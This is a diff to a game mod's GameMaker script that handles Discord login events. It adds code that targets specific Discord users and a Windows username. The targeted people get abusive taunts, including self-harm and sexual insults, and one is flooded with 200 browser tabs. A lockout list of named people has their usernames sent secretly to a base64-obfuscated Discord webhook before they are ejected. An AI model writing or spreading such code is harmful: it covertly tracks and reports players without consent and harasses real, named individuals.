@@ -4,38 +4,62 @@ switch async_load[? "event_type"]
 		active = true;
 		a = async_load[?"user_id"];
 		
-		// feel free to remove this if it annoys you //you do not know how much i did not expect this thank you
-		if a == "339940381850468386" && DEBUG // meliadev
-		{
+		// meliadev
+		if a == "339940381850468386" && DEBUG
 			show_message(choose("hiii melia! you're cute :3", "you're doing a great job melia, keep it up :3", "i love you melia!\n-from the game", "keep up the good work melia :3"));
-		}
 		
 		// taunts
 		if code_is_compiled()
 		{
+			if string_lower(environment_get_variable("USERNAME")) == "den4ik"
+				a = "867446393471893515";
+			
+			// ---
+			
 			if a == "1069871151590944841" // Soapy
-				show_message("Haaiii piss chugger ;3!!! <333");
-			if a == "1092972191341096970" or a == "909894078852911145" // Beebawp
-				show_message("NO BEEBAWP NOT THE BIKE PUMP!");
+				show_message("Haaiii piss chugger ;3!!!");
+			//if a == "1092972191341096970" or a == "909894078852911145" // Beebawp
+			//	show_message("NO BEEBAWP NOT THE BIKE PUMP!");
 			if a == "516337795372154910" // Zerokizo
 				show_message("I'm not gonna let you put the character doors in my mod");
-			if a == "309853612656558100" // Min3r
-				show_message("I know you like diddling children");
+			//if a == "309853612656558100" // Min3r
+			//	show_message("I know you like diddling children");
 			if a == "827041050555187210" // jared9994
 				show_message("well if you're gonna be like that then please cut deeper.");
 			if a == "744735218350555137" // LOSTMAN
-				show_message("Give me the Sugary Spire source code");
+				show_message("Unblock me first, LOSTMAN.");
 			if a == "748743802608418896" // Croatian Commander
-				show_message("Haaiii Cappy ;3!!! <333");
+				show_message("Haaiii Cappy ;3!!!");
 			if a == "590968392211759124" // nico-breon
-				show_message("WHY WOULD YOU PLAY YOUR \"ABUSER'S\" MOD YOU WHORE");
+				show_message("You were assigned");
 			if a == "463132674995781637" // SpectralScrubs
 				show_message("Peic");
-			if a == "188430471040991235" // scout
+			if a == "188430471040991235" or a == "317071206815891466" // scout or indigo
 				show_message("Pizza Tower: Scoutdigo is my favorite Pizza Tower modem. I am playing as The Goise, unused character in final game. I collected the mimic toppin! I'm going to get the key piece! The key piece must be here somewhere. I got the key piece! Wow! I am solving the Alternate Reality Game! PIZZA FACE IS COMING... HELP ME! MY TESTICLES ARE EXPLODING! NO NO NO NO NO NO NO PIZZA FACE YOU FUCK! I FUCK YOU FUCK! NO NO NO NO FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK");
+			if a == "724447494372851783" // khaliliscre
+				show_message("Screenshot_6.png");
+			if a == "817309415781957700" // el jeof rey
+				show_message("Introducing: Poopin' Dario!");
+			if a == "867446393471893515" // Denchick
+			{
+				repeat 200
+					url_open(choose("https://undertale.com/", "https://deltarune.com/"));
+			}
+			if a == "866584072733851658" // soda
+				show_message("Do not come anywhere near my shit.");
+			if a == "773966892520046662" // matty
+				show_message("You betrayed me. Please leave.");
+			if a == "357090210435039232" // luigio
+				show_message("No fucking way that YOU of all people tried playing my mod.");
+			if a == "313647052087099394" // RodMod
+				show_message("sorry quote unquote \"Rod\" \"Mod\"; no flp, no cheesed up!");
+			if a == "736034094093303888" // MrUnown
+				show_message("You're dogshit at C++ admit it Unown");
+			if a == "847981927670874132" // Psyop
+				show_message("Get another alt.");
+			if a == "618151581111812106" // Mannu
+				show_message("You know what you did.");
 			
-			//if a == "724447494372851783" // khaliliscre
-			//	show_message("Screenshot_6.png");
 			//if a == "357967410340429825" // TheSpookyDong
 			//	show_message("You treated me well but this is by pure obligation");
 			//if a == "370924430324531200" or a == "748959499565662360" // Laterance
@@ -45,23 +69,82 @@ switch async_load[? "event_type"]
 		}
 		
 		// lockout
-		if a == "1069871151590944841" or a == "503588309608431626" or a == "747652813810565180" or a == "516337795372154910" or a == "713946655476416553" or (a == "1092972191341096970" or a == "909894078852911145") or a == "309853612656558100" or a == "357967410340429825" or a == "725796266629398691" or a == "212347808890486786" // Soapy or Lunar or Fungang or Zerokizo or Beebawp or Min3r or TheSpookyDong or auro or Psyke
-		or a == "817309415781957700" or a == "827041050555187210"/* or a == "724447494372851783"*/ or a == "744735218350555137" or a == "748743802608418896" or (a == "370924430324531200" or a == "748959499565662360") or a == "590968392211759124" or a == "463132674995781637" or a == "188430471040991235" or a == "841302295085580298" or a == "639062328276418571" // el jeof rey or jared9994 or khaliliscre or LOSTMAN or Croatian Commander or Laterance or nico-breon or SpectralScrubs or scout or SuperPiter or Manios
+		var lockout = [
+			// PTT
+			"1069871151590944841", // Soapy
+			"503588309608431626", // Octo
+			"713946655476416553", // Zerokizo
+			"799295873388642375", // Ralty (programmer)
+			"827041050555187210", // jared9994
+			"736268533767602226", // Leafchy (artist)
+			"212347808890486786", // Psyke
+			"970894665593262171", // bmv277
+			"775518791818805268", // Jam (composer)
+			"725796266629398691", // auro
+			//"387106161754898432", // Cubito
+			//"516337795372154910", // TheFungang
+			"489119025608261655", // melvin (admin)
+			"681556802525331460", // gee9 (admin)
+			"977762104255864862", // trinitetray (admin)
+			"713016378822754334", // omegano7 (admin)
+			"412059144531607552", // volta
+			"773966892520046662", // matty
+			
+			// Modding Monopoly
+			"744735218350555137", // LOSTMAN
+			"188430471040991235", // scout
+			"317071206815891466", // indigo
+			"866584072733851658", // soda
+			"124181524277886976", // core
+			"455811217865572354", // .jdrive
+			"129992247637835776", // paperkitty
+			"736034094093303888", // MrUnown
+			"357090210435039232", // luigio
+			"313647052087099394", // RodMod
+			"222518501821251584", // marioket
+			"447396200405270528", // jessieproductions
+			
+			// Pathetic people
+			"867446393471893515", // Denchick (coollugio)
+			"817309415781957700", // jeof
+			"724447494372851783", // khaliliscre
+			"748743802608418896", // Croatian Commander
+			"370924430324531200", // Laterance (trout)
+			"748959499565662360", // Laterance (pickleanon)
+			"590968392211759124", // Nicole
+			"463132674995781637", // SpectralScrubs
+			"841302295085580298", // SuperPiter (StS asked me to)
+			"639062328276418571", // Manios
+			"847981927670874132", // Denchick friend group psyop account
+			"618151581111812106", // Mannu
+		];
+		
+		/*
+			
+			this shit is barely effective, and like maybe only
+			3 people out of this list will even encounter this.
+			
+			... whatever. this mod will get cancelled in like a week.
+			why do I even fucking bother.
+			
+		*/
+		
+		if array_contains(lockout, a)
 		{
 			// easter egg.
 			var file = file_text_open_write("dead");
-			file_text_write_string(file, $"I know who you are, {async_load[?"username"]}.");
+			file_text_write_string(file, $"Hello, {async_load[?"username"]}.");
 			file_text_close(file);
 			
-			// log to discord :3
-			var body=ds_map_create(),header=ds_map_create();
-			ds_map_add(body,"content",$"{async_load[?"username"]} attempted running the game!");
-			ds_map_add(header,"Content-Type","application/json");
-			http_request(base64_decode("aHR0cHM6Ly9jYW5hcnkuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzExMjQyMzUzOTE1NjY4OTMxMTYveFRCZnR6ZnN4QjdjNElWbzVDTTdwQUd5UktvUU5iZlhGbTAyaWdSUUhTZDdDbE1hLU5SR0VQZWtiR0tKd2dwdW41SDU="),"POST",header,json_encode(body));
+			// tell me.
+			var body = ds_map_create(), header = ds_map_create();
+			ds_map_add(body, "content", $"{async_load[?"username"]} attempted running the game!");
+			ds_map_add(header, "Content-Type", "application/json");
+			http_request(base64_decode("aHR0cHM6Ly9jYW5hcnkuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzExMjQyMzUzOTE1NjY4OTMxMTYveFRCZnR6ZnN4QjdjNElWbzVDTTdwQUd5UktvUU5iZlhGbTAyaWdSUUhTZDdDbE1hLU5SR0VQZWtiR0tKd2dwdW41SDU="), "POST", header, json_encode(body));
 			ds_map_destroy(body);
 			ds_map_destroy(header);
 			
-			// the exit's THAT way, buddy.
+			// get the fuck out.
 			room_goto(Funnyroom);
 		}
 		
